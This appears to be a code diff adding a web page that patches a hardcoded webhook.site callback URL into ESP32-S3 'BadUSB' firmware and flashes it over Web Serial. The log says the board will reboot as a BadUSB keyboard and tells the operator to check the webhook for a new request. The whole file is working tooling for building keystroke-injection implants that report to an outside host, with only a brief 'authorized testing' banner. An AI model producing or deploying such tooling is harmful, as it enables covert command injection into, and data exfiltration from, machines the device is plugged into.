@@ -1,0 +1,273 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8" />
+    <title>ESP32-S3 BadUSB Web Flasher</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; padding: 30px; background: #0d1117; color: #c9d1d9; max-width: 860px; margin: auto; }
+        h1 { color: #58a6ff; }
+        .warning { background: #3d1f1f; border-left: 4px solid #f85149; padding: 12px; margin: 15px 0; border-radius: 4px; }
+        .info { background: #1f2d3d; border-left: 4px solid #58a6ff; padding: 12px; margin: 15px 0; border-radius: 4px; font-size: 14px; }
+        button { padding: 12px 24px; font-size: 16px; margin: 8px 4px; border: none; border-radius: 6px; cursor: pointer; background: #238636; color: white; transition: background 0.15s; }
+        button:hover:not(:disabled) { background: #2ea043; }
+        button:disabled { background: #484f58; cursor: not-allowed; }
+        input[type="text"] { width: 100%; padding: 10px; font-size: 14px; background: #161b22; border: 1px solid #30363d; color: #c9d1d9; border-radius: 6px; box-sizing: border-box; }
+        input[type="file"] { margin: 10px 0; color: #c9d1d9; }
+        #log { background: #010409; color: #3fb950; padding: 15px; font-family: 'Consolas', 'Courier New', monospace; font-size: 13px; height: 340px; overflow-y: scroll; border-radius: 6px; border: 1px solid #30363d; white-space: pre-wrap; }
+        label { display: block; margin-top: 15px; font-weight: bold; color: #8b949e; }
+        .step { background: #161b22; padding: 15px; border-radius: 8px; margin: 15px 0; border: 1px solid #30363d; }
+        code { background: #21262d; padding: 2px 6px; border-radius: 4px; color: #79c0ff; }
+        .status { display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 12px; font-weight: bold; }
+        .status.ok { background: #1f6f3f; color: #7ee787; }
+        .status.err { background: #6f1f1f; color: #ff7b72; }
+    </style>
+</head>
+<body>
+    <h1>🔓 ESP32-S3 BadUSB Web Flasher</h1>
+
+    <div class="warning">
+        <strong>⚠️ Authorized Testing Only.</strong> Use only on hardware you own, for security research in a lab environment.
+    </div>
+
+    <div class="step">
+        <h3>Step 1: Webhook URL</h3>
+        <label>This URL gets patched directly into the firmware binary:</label>
+        <input type="text" id="webhookInput" />
+    </div>
+
+    <div class="step">
+        <h3>Step 2: Firmware</h3>
+        <label>Auto-loaded from <code>./firmware.bin</code></label>
+        <div id="firmwareStatus" style="margin-top:8px; font-size:14px;">
+            Status: <span class="status err" id="fwBadge">Not loaded</span>
+            <span id="fwInfo" style="color:#8b949e; margin-left:10px;"></span>
+        </div>
+        <p style="font-size:12px; color:#8b949e; margin-top:10px;">
+            Looking for <code>firmware.bin</code> next to this page.<br/>
+            If missing, copy your <code>badusb.ino.merged.bin</code> here and rename it to <code>firmware.bin</code>.<br/>
+            <label style="color:#8b949e; margin-top:8px;">Or select manually:</label>
+            <input type="file" id="firmwareFile" accept=".bin" />
+        </p>
+    </div>
+
+    <div class="step">
+        <h3>Step 3: Flash</h3>
+        <p style="font-size: 14px;">Put ESP32-S3 in download mode: <strong>Hold BOOT → Press RESET → Release BOOT</strong></p>
+        <button id="connectBtn">1. Connect</button>
+        <button id="flashBtn" disabled>2. Patch &amp; Flash</button>
+    </div>
+
+    <div id="log">Ready.</div>
+
+    <script type="module">
+        import { ESPLoader, Transport } from 'https://unpkg.com/esptool-js/bundle.js';
+
+        // ============================================================
+        // HARDCODED WEBHOOK URL
+        // ============================================================
+        const DEFAULT_WEBHOOK = "https://webhook.site/7bfaf846-c7ff-4f51-bfd9-5a0379acaa5c";
+
+        // Path to auto-loaded firmware (relative to this HTML file)
+        const FIRMWARE_PATH = "firmware.bin";
+
+        // MUST match the placeholder string in the firmware exactly.
+        const PLACEHOLDER = "https://webhook.site/00000000-0000-0000-0000-000000000000#PLACEHOLDER";
+
+        // MUST match sizeof(webhookUrl) in the firmware (char webhookUrl[128])
+        const BUFFER_SIZE = 128;
+        // ============================================================
+
+        const logEl = document.getElementById('log');
+        const connectBtn = document.getElementById('connectBtn');
+        const flashBtn = document.getElementById('flashBtn');
+        const fwBadge = document.getElementById('fwBadge');
+        const fwInfo = document.getElementById('fwInfo');
+        const fileInput = document.getElementById('firmwareFile');
+
+        document.getElementById('webhookInput').value = DEFAULT_WEBHOOK;
+
+        let transport = null;
+        let loader = null;
+        let firmwareBytes = null;   // Uint8Array of the loaded firmware
+
+        const terminal = {
+            clean: () => { logEl.textContent = ''; },
+            writeLine: (d) => { logEl.textContent += d + '\n'; logEl.scrollTop = logEl.scrollHeight; },
+            write: (d) => { logEl.textContent += d; logEl.scrollTop = logEl.scrollHeight; },
+        };
+
+        function log(msg) {
+            logEl.textContent += msg + '\n';
+            logEl.scrollTop = logEl.scrollHeight;
+        }
+
+        // ---------- Firmware auto-loader ----------
+        async function loadFirmwareFromPath(path) {
+            try {
+                const res = await fetch(path, { cache: 'no-store' });
+                if (!res.ok) throw new Error(`HTTP ${res.status}`);
+                const buf = await res.arrayBuffer();
+                firmwareBytes = new Uint8Array(buf);
+                fwBadge.textContent = 'Loaded';
+                fwBadge.className = 'status ok';
+                fwInfo.textContent = `(${firmwareBytes.length.toLocaleString()} bytes from ./${path})`;
+                log(`[*] Auto-loaded firmware: ${firmwareBytes.length} bytes from ./${path}`);
+                flashBtn.disabled = !loader;
+            } catch (err) {
+                firmwareBytes = null;
+                fwBadge.textContent = 'Not loaded';
+                fwBadge.className = 'status err';
+                fwInfo.textContent = `(${err.message} — copy firmware.bin next to this file)`;
+                log(`[!] Could not auto-load ./${path}: ${err.message}`);
+                log(`    -> Copy badusb.ino.merged.bin here and rename to firmware.bin`);
+            }
+        }
+
+        fileInput.addEventListener('change', async (e) => {
+            const f = e.target.files[0];
+            if (!f) return;
+            const buf = await f.arrayBuffer();
+            firmwareBytes = new Uint8Array(buf);
+            fwBadge.textContent = 'Loaded (manual)';
+            fwBadge.className = 'status ok';
+            fwInfo.textContent = `(${firmwareBytes.length.toLocaleString()} bytes from ${f.name})`;
+            log(`[*] Manually loaded firmware: ${firmwareBytes.length} bytes`);
+            flashBtn.disabled = !loader;
+        });
+
+        // ---------- Helpers ----------
+        function findBytes(haystack, needle) {
+            outer:
+            for (let i = 0; i <= haystack.length - needle.length; i++) {
+                for (let j = 0; j < needle.length; j++) {
+                    if (haystack[i + j] !== needle[j]) continue outer;
+                }
+                return i;
+            }
+            return -1;
+        }
+
+        function patchFirmware(fwBytes, url) {
+            const enc = new TextEncoder();
+            const markerBytes = enc.encode(PLACEHOLDER);
+            const urlBytes = enc.encode(url);
+
+            if (urlBytes.length >= BUFFER_SIZE) {
+                throw new Error(`URL too long: ${urlBytes.length} bytes (max ${BUFFER_SIZE - 1})`);
+            }
+
+            const offset = findBytes(fwBytes, markerBytes);
+            if (offset === -1) {
+                throw new Error("Placeholder not found in firmware. Did you change the string in badusb.ino?");
+            }
+            log(`[*] Placeholder found at byte offset 0x${offset.toString(16)}`);
+
+            const patch = new Uint8Array(BUFFER_SIZE);
+            patch.set(urlBytes);
+            fwBytes.set(patch, offset);
+
+            log(`[*] Patched with URL: ${url}`);
+        }
+
+        // Safe reset that works across esptool-js versions
+        async function safeReset() {
+            try {
+                if (typeof loader.hardReset === 'function') {
+                    log('[*] Auto-reset via hardReset()...');
+                    await loader.hardReset();
+                    log('[+] Device reset.');
+                    return;
+                }
+                if (typeof loader.after === 'function') {
+                    log('[*] Auto-reset via after()...');
+                    await loader.after();
+                    log('[+] Device reset.');
+                    return;
+                }
+                // Manual DTR/RTS toggle fallback
+                log('[*] Auto-reset via DTR/RTS toggle...');
+                await transport.setDTR(false);
+                await transport.setRTS(true);
+                await new Promise(r => setTimeout(r, 100));
+                await transport.setRTS(false);
+                await new Promise(r => setTimeout(r, 100));
+                log('[+] Reset sequence sent.');
+            } catch (e) {
+                log(`[i] Auto-reset failed (${e.message}). Press the RESET button on the board.`);
+            }
+        }
+
+        // ---------- Connect ----------
+        connectBtn.addEventListener('click', async () => {
+            try {
+                log('Requesting serial port...');
+                const port = await navigator.serial.requestPort();
+                transport = new Transport(port);
+                loader = new ESPLoader({
+                    transport,
+                    baudrate: 921600,
+                    terminal,
+                });
+                log('Connecting to chip...');
+                const chip = await loader.main();
+                log(`[+] Detected: ${chip}`);
+                connectBtn.disabled = true;
+                flashBtn.disabled = !firmwareBytes;
+            } catch (err) {
+                log(`[!] Connection error: ${err.message}`);
+            }
+        });
+
+        // ---------- Flash ----------
+        flashBtn.addEventListener('click', async () => {
+            if (!firmwareBytes) {
+                alert('No firmware loaded. Copy firmware.bin next to this page, or use the manual picker.');
+                return;
+            }
+            const url = document.getElementById('webhookInput').value.trim();
+            if (!url.startsWith('http')) {
+                alert('URL must start with http:// or https://');
+                return;
+            }
+
+            try {
+                flashBtn.disabled = true;
+
+                // Work on a copy so re-flashing with a different URL doesn't double-patch
+                const buf = new Uint8Array(firmwareBytes);
+                log(`[*] Firmware size: ${buf.length.toLocaleString()} bytes`);
+
+                patchFirmware(buf, url);
+
+                log('[*] Flashing patched firmware at 0x0...');
+                await loader.writeFlash({
+                    fileArray: [{ data: buf, address: 0x0 }],
+                    flashSize: 'keep',
+                    flashMode: 'keep',
+                    flashFreq: 'keep',
+                    eraseAll: true,
+                    compress: true,
+                    reportProgress: (i, written, total) => {
+                        const pct = ((written / total) * 100).toFixed(1);
+                        logEl.textContent = logEl.textContent.replace(/\[Flashing.*\n?$/, '');
+                        log(`[Flashing] ${pct}%`);
+                    }
+                });
+                log('[+] Firmware flashed.');
+
+                await safeReset();
+                log('[+] Done! Device will reboot as a BadUSB keyboard.');
+                log('=== Check your webhook for a new request ===');
+                flashBtn.disabled = false;
+            } catch (err) {
+                log(`[!] Error: ${err.message}`);
+                flashBtn.disabled = false;
+            }
+        });
+
+        // ---------- Boot ----------
+        log('Ready.');
+        await loadFirmwareFromPath(FIRMWARE_PATH);
+    </script>
+</body>
+</html>
